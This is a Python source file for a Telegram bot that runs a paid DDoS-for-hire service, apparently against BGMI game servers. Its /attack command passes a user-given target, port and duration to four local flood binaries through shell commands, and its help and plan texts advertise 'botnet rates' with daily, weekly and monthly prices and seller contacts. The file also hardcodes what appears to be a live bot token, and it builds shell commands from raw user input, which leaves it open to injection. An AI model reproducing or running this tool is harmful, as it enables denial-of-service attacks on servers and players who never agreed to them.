import telebot
import subprocess
import datetime
import time
import threading

from keep_alive import keep_alive
keep_alive()

# Initialize two bot instances
bot1 = telebot.TeleBot('7040239733:AAGM9591VAncSYg5SW0Ms6AWZ7ETqsz5_Mc')
bot2 = telebot.TeleBot('TOKEN')

# Common settings
ADMIN_IDS = {"1434287051", ""}
COOLDOWN_TIME = 300
bgmi_cooldown = {}

# Predefined list of allowed user IDs
allowed_user_ids = {"1434287051", ""}  # Example user IDs, replace with actual IDs

def log_command(user_id, target, port, time_duration):
    chat = bot1.get_chat(user_id)  # Assuming both bots share the same user base
    username = f"@{chat.username}" if chat.username else f"UserID: {user_id}"
    print(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")  # Print instead of logging to a file

def handle_bot(bot):

    @bot.message_handler(commands=['add'])
    def add_user(message):
        if str(message.chat.id) in ADMIN_IDS:
            parts = message.text.split()
            if len(parts) > 1:
                user_id = parts[1]
                if user_id not in allowed_user_ids:
                    allowed_user_ids.add(user_id)
                    response = f"User {user_id} added successfully 👍."
                else:
                    response = "User already exists 🤦‍♂️."
            else:
                response = "Please specify a user ID to add 😒."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['remove'])
    def remove_user(message):
        if str(message.chat.id) in ADMIN_IDS:
            parts = message.text.split()
            if len(parts) > 1:
                user_id = parts[1]
                if user_id in allowed_user_ids:
                    allowed_user_ids.remove(user_id)
                    response = f"User {user_id} removed successfully 👍."
                else:
                    response = f"User {user_id} not found in the list."
            else:
                response = "Please specify a user ID to remove. Usage: /remove <userid>"
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['clearlogs'])
    def clear_logs_command(message):
        if str(message.chat.id) in ADMIN_IDS:
            response = "Logs cleared successfully ✅"  # No actual log clearing, just a response
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['allusers'])
    def show_all_users(message):
        if str(message.chat.id) in ADMIN_IDS:
            if allowed_user_ids:
                users_info = "\n".join(
                    f"- @{bot.get_chat(int(user_id)).username} (ID: {user_id})" if bot.get_chat(int(user_id)).username else f"- User ID: {user_id}"
                    for user_id in allowed_user_ids
                )
                response = f"Authorized Users:\n{users_info}"
            else:
                response = "No data found."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['logs'])
    def show_recent_logs(message):
        if str(message.chat.id) in ADMIN_IDS:
            response = "No logs found."  # No actual logs, just a response
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        bot.reply_to(message, f"🤖Your ID: {str(message.chat.id)}")

    @bot.message_handler(commands=['attack'])
    def handle_bgmi(message):
        user_id = str(message.chat.id)
        if user_id in allowed_user_ids:
            if user_id not in ADMIN_IDS and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before running the /bgmi command again.")
                return
            parts = message.text.split()
            if len(parts) == 4:
                target, port, time_duration = parts[1], int(parts[2]), int(parts[3])
                if time_duration > 240:
                    response = "Error: Time interval must be less than 240."
                else:
                    bgmi_cooldown[user_id] = datetime.datetime.now()
                    log_command(user_id, target, port, time_duration)
                    response = f"Attack Started 🚀 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
                    bot.reply_to(message, response)
                    subprocess.run(f"./bgmi {target} {port} {time_duration} 200", shell=True)
                    time.sleep(5)
                    subprocess.run(f"./YUVRAJ {target} {port} {time_duration} 200", shell=True)
                    time.sleep(4)
                    subprocess.run(f"./YUVRAJV2 {target} {port} {time_duration} 200", shell=True)
                    time.sleep(3)
                    subprocess.run(f"./YUVRAJV3 {target} {port} {time_duration} 200", shell=True)
                    return
            else:
                response = "✅ Usage :- /attack <target> <port> <time>"
        else:
            response = "You are not authorized to use this command."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['mylogs'])
    def show_command_logs(message):
        user_id = str(message.chat.id)
        if user_id in allowed_user_ids:
            response = "No command logs found for you."  # No actual logs, just a response
        else:
            response = "You are not authorized to use this command."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['help'])
    def show_help(message):
        help_text = '''🤖 Available commands:
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @SHUBH_K2
Official Channel :- @SHUBHxANDROID'''
        bot.reply_to(message, help_text)

    @bot.message_handler(commands=['start'])
    def welcome_start(message):
        welcome_text = f"👋🏻Welcome to Your Home, {message.from_user.first_name}! Feel Free to Explore.\n🤖Try To Run This Command : /help \n✅Join :- @SHUBHxANDROID"
        bot.reply_to(message, welcome_text)

    @bot.message_handler(commands=['rules'])
    def welcome_rules(message):
        rules_text = f"{message.from_user.first_name} Please Follow These Rules ⚠️:\n\n1. Don't Run Too Many Attacks!! Cause A Ban From Bot\n2. Don't Run 2 Attacks At Same Time Because If You Do, You Will Get Banned From Bot.\n3. We Daily Check The Logs So Follow These Rules to Avoid Ban!!"
        bot.reply_to(message, rules_text)

    @bot.message_handler(commands=['plan'])
    def welcome_plan(message):
        plan_text = f"{message.from_user.first_name}, Brother Only 1 Plan Is Powerful Than Any Other DDoS!!:\n\nVip 🌟 :\n-> Attack Time: 180 (S)\n-> After Attack Limit: 5 Min\n-> Concurrents Attack: 3\n\nPrice List💸 :\nDay-->200 Rs\nWeek-->600 Rs\nMonth-->1200 Rs"
        bot.reply_to(message, plan_text)

    @bot.message_handler(commands=['admincmd'])
    def show_admin_commands(message):
        admin_text = "Admin Commands:\n/add <userid> - Add a user.\n/remove <userid> - Remove a user.\n/clearlogs - Clear logs.\n/logs - Show recent logs.\n/allusers - Show all authorized users."
        bot.reply_to(message, admin_text)

    bot.polling(none_stop=True)

def start_bot(bot):
    threading.Thread(target=handle_bot, args=(bot,)).start()

# Start both bots concurrently
start_bot(bot1)
start_bot(bot2)
